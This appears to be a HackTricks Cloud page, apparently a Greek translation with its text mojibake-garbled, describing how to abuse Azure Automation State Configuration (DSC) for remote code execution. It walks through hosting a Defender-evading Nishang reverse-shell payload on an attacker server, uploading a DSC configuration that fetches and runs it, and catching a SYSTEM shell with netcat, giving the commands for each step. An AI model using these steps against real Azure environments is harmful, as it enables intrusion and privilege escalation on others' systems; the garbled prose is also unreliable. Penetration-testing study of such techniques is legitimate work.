# Az - State Configuration RCE

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

**Check the complete post in:** [**https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe**](https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe)

### Summary of Remote Server (C2) Infrastructure Preparation and Steps

#### Overview

Î— Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½ÎµÎ¹ Ï„Î·Î½ ÎµÎ³ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· Î¼Î¹Î±Ï‚ Ï…Ï€Î¿Î´Î¿Î¼Î®Ï‚ Î±Ï€Î¿Î¼Î±ÎºÏÏ…ÏƒÎ¼Î­Î½Î¿Ï… Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® Î³Î¹Î± Ï„Î· Ï†Î¹Î»Î¿Î¾ÎµÎ½Î¯Î± ÎµÎ½ÏŒÏ‚ Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿Ï… payload `Invoke-PowerShellTcp.ps1` Ï„Î¿Ï… Nishang, Î¿Î½ÏŒÎ¼Î±Ï„Î¹ `RevPS.ps1`, ÏƒÏ‡ÎµÎ´Î¹Î±ÏƒÎ¼Î­Î½Î¿ Î½Î± Ï€Î±ÏÎ±ÎºÎ¬Î¼Ï€Ï„ÎµÎ¹ Ï„Î¿ Windows Defender. Î¤Î¿ payload ÎµÎ¾Ï…Ï€Î·ÏÎµÏ„ÎµÎ¯Ï„Î±Î¹ Î±Ï€ÏŒ Î¼Î¹Î± Î¼Î·Ï‡Î±Î½Î® Kali Linux Î¼Îµ IP `40.84.7.74` Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Î­Î½Î±Î½ Î±Ï€Î»ÏŒ Python HTTP server. Î— Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ Î¼Î­ÏƒÏ‰ Î±ÏÎºÎµÏ„ÏÎ½ Î²Î·Î¼Î¬Ï„Ï‰Î½:

#### Step 1 â€” Create Files

* **Files Required:** Î‘Ï€Î±Î¹Ï„Î¿ÏÎ½Ï„Î±Î¹ Î´ÏÎ¿ ÏƒÎµÎ½Î¬ÏÎ¹Î± PowerShell:
1. `reverse_shell_config.ps1`: ÎˆÎ½Î± Î±ÏÏ‡ÎµÎ¯Î¿ Desired State Configuration (DSC) Ï€Î¿Ï… Î±Î½Î±ÎºÏ„Î¬ ÎºÎ±Î¹ ÎµÎºÏ„ÎµÎ»ÎµÎ¯ Ï„Î¿ payload. Î•Î¯Î½Î±Î¹ Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼Î¿ Î±Ï€ÏŒ Ï„Î¿ [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse\_shell\_config.ps1).
2. `push_reverse_shell_config.ps1`: ÎˆÎ½Î± ÏƒÎµÎ½Î¬ÏÎ¹Î¿ Î³Î¹Î± Ï„Î· Î´Î·Î¼Î¿ÏƒÎ¯ÎµÏ…ÏƒÎ· Ï„Î·Ï‚ Î´Î¹Î±Î¼ÏŒÏÏ†Ï‰ÏƒÎ·Ï‚ ÏƒÏ„Î· VM, Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼Î¿ ÏƒÏ„Î¿ [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push\_reverse\_shell\_config.ps1).
* **Customization:** ÎŸÎ¹ Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î­Ï‚ ÎºÎ±Î¹ Î¿Î¹ Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿Î¹ ÏƒÎµ Î±Ï…Ï„Î¬ Ï„Î± Î±ÏÏ‡ÎµÎ¯Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï€ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÏ„Î¿ÏÎ½ ÏƒÏ„Î¿ ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î¿ Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½ Ï„Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î·, ÏƒÏ…Î¼Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î±Î½Î¿Î¼Î­Î½Ï‰Î½ Ï„Ï‰Î½ Î¿Î½Î¿Î¼Î¬Ï„Ï‰Î½ Ï€ÏŒÏÏ‰Î½, Ï„Ï‰Î½ Î´Î¹Î±Î´ÏÎ¿Î¼ÏÎ½ Î±ÏÏ‡ÎµÎ¯Ï‰Î½ ÎºÎ±Î¹ Ï„Ï‰Î½ Î±Î½Î±Î³Î½Ï‰ÏÎ¹ÏƒÏ„Î¹ÎºÏÎ½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®/payload.

#### Step 2 â€” Zip Configuration File

* Î¤Î¿ `reverse_shell_config.ps1` ÏƒÏ…Î¼Ï€Î¹Î­Î¶ÎµÏ„Î±Î¹ ÏƒÎµ Î­Î½Î± Î±ÏÏ‡ÎµÎ¯Î¿ `.zip`, ÎºÎ±Î¸Î¹ÏƒÏ„ÏÎ½Ï„Î±Ï‚ Ï„Î¿ Î­Ï„Î¿Î¹Î¼Î¿ Î³Î¹Î± Î¼ÎµÏ„Î±Ï†Î¿ÏÎ¬ ÏƒÏ„Î¿Î½ Azure Storage Account.
```powershell
Compress-Archive -Path .\reverse_shell_config.ps1 -DestinationPath .\reverse_shell_config.ps1.zip
```
#### Step 3 â€” Set Storage Context & Upload

* Î¤Î¿ ÏƒÏ…Î¼Ï€Î¹ÎµÏƒÎ¼Î­Î½Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ ÏÏÎ¸Î¼Î¹ÏƒÎ·Ï‚ Î¼ÎµÏ„Î±Ï†Î¿ÏÏ„ÏÎ½ÎµÏ„Î±Î¹ ÏƒÎµ Î­Î½Î± Ï€ÏÎ¿ÎºÎ±Î¸Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î¿ Azure Storage container, azure-pentest, Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ Azure's Set-AzStorageBlobContent cmdlet.
```powershell
Set-AzStorageBlobContent -File "reverse_shell_config.ps1.zip" -Container "azure-pentest" -Blob "reverse_shell_config.ps1.zip" -Context $ctx
```
#### Î’Î®Î¼Î± 4 â€” Î ÏÎ¿ÎµÏ„Î¿Î¹Î¼Î±ÏƒÎ¯Î± Ï„Î¿Ï… Kali Box

* ÎŸ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®Ï‚ Kali ÎºÎ±Ï„ÎµÎ²Î¬Î¶ÎµÎ¹ Ï„Î¿ Ï†Î¿ÏÏ„Î¯Î¿ RevPS.ps1 Î±Ï€ÏŒ Î­Î½Î± Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î¿ GitHub.
```bash
wget https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1
```
* Î¤Î¿ ÏƒÎµÎ½Î¬ÏÎ¹Î¿ ÎµÏ€ÎµÎ¾ÎµÏÎ³Î¬Î¶ÎµÏ„Î±Î¹ Î³Î¹Î± Î½Î± ÎºÎ±Î¸Î¿ÏÎ¯ÏƒÎµÎ¹ Ï„Î¿ ÏƒÏ„Î¿Ï‡ÎµÏ…Î¼Î­Î½Î¿ Windows VM ÎºÎ±Î¹ Ï„Î·Î½ Ï€ÏŒÏÏ„Î± Î³Î¹Î± Ï„Î¿ reverse shell.

#### Î’Î®Î¼Î± 5 â€” Î”Î·Î¼Î¿ÏƒÎ¯ÎµÏ…ÏƒÎ· Î‘ÏÏ‡ÎµÎ¯Î¿Ï… Î¡Ï…Î¸Î¼Î¯ÏƒÎµÏ‰Î½

* Î¤Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ ÏÏ…Î¸Î¼Î¯ÏƒÎµÏ‰Î½ ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹, Î¼Îµ Î±Ï€Î¿Ï„Î­Î»ÎµÏƒÎ¼Î± Ï„Î¿ ÏƒÎµÎ½Î¬ÏÎ¹Î¿ reverse-shell Î½Î± Î±Î½Î±Ï€Ï„Ï…Ï‡Î¸ÎµÎ¯ ÏƒÏ„Î·Î½ ÎºÎ±Î¸Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î· Ï„Î¿Ï€Î¿Î¸ÎµÏƒÎ¯Î± ÏƒÏ„Î¿ Windows VM.

#### Î’Î®Î¼Î± 6 â€” Î¦Î¹Î»Î¿Î¾ÎµÎ½Î¯Î± Payload ÎºÎ±Î¹ Î¡ÏÎ¸Î¼Î¹ÏƒÎ· Listener

* ÎˆÎ½Î±Ï‚ Python SimpleHTTPServer Î¾ÎµÎºÎ¹Î½Î¬ Î³Î¹Î± Î½Î± Ï†Î¹Î»Î¿Î¾ÎµÎ½Î®ÏƒÎµÎ¹ Ï„Î¿ payload, Î¼Î±Î¶Î¯ Î¼Îµ Î­Î½Î±Î½ Netcat listener Î³Î¹Î± Î½Î± ÎºÎ±Ï„Î±Î³ÏÎ¬ÏˆÎµÎ¹ Ï„Î¹Ï‚ ÎµÎ¹ÏƒÎµÏÏ‡ÏŒÎ¼ÎµÎ½ÎµÏ‚ ÏƒÏ…Î½Î´Î­ÏƒÎµÎ¹Ï‚.
```bash
sudo python -m SimpleHTTPServer 80
sudo nc -nlvp 443
```
* Î— Ï€ÏÎ¿Î³ÏÎ±Î¼Î¼Î±Ï„Î¹ÏƒÎ¼Î­Î½Î· ÎµÏÎ³Î±ÏƒÎ¯Î± ÎµÎºÏ„ÎµÎ»ÎµÎ¯ Ï„Î¿ payload, ÎµÏ€Î¹Ï„Ï…Î³Ï‡Î¬Î½Î¿Î½Ï„Î±Ï‚ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± ÎµÏ€Î¹Ï€Î­Î´Î¿Ï… SYSTEM.

#### Î£Ï…Î¼Ï€Î­ÏÎ±ÏƒÎ¼Î±

Î— ÎµÏ€Î¹Ï„Ï…Ï‡Î®Ï‚ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Î±Ï…Ï„Î®Ï‚ Ï„Î·Ï‚ Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î±Ï‚ Î±Î½Î¿Î¯Î³ÎµÎ¹ Ï€Î¿Î»Î»Î­Ï‚ Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„ÎµÏ‚ Î³Î¹Î± Ï€ÎµÏÎ±Î¹Ï„Î­ÏÏ‰ ÎµÎ½Î­ÏÎ³ÎµÎ¹ÎµÏ‚, ÏŒÏ€Ï‰Ï‚ Î· ÎµÎ¾Î±Î³Ï‰Î³Î® Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î·ÏÎ¯Ï‰Î½ Î® Î· ÎµÏ€Î­ÎºÏ„Î±ÏƒÎ· Ï„Î·Ï‚ ÎµÏ€Î¯Î¸ÎµÏƒÎ·Ï‚ ÏƒÎµ Ï€Î¿Î»Î»Î­Ï‚ VM. ÎŸ Î¿Î´Î·Î³ÏŒÏ‚ ÎµÎ½Î¸Î±ÏÏÏÎ½ÎµÎ¹ Ï„Î· ÏƒÏ…Î½ÎµÏ‡Î¹Î¶ÏŒÎ¼ÎµÎ½Î· Î¼Î¬Î¸Î·ÏƒÎ· ÎºÎ±Î¹ Ï„Î· Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¹ÎºÏŒÏ„Î·Ï„Î± ÏƒÏ„Î¿Î½ Ï„Î¿Î¼Î­Î± Ï„Î¿Ï… Azure Automation DSC.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
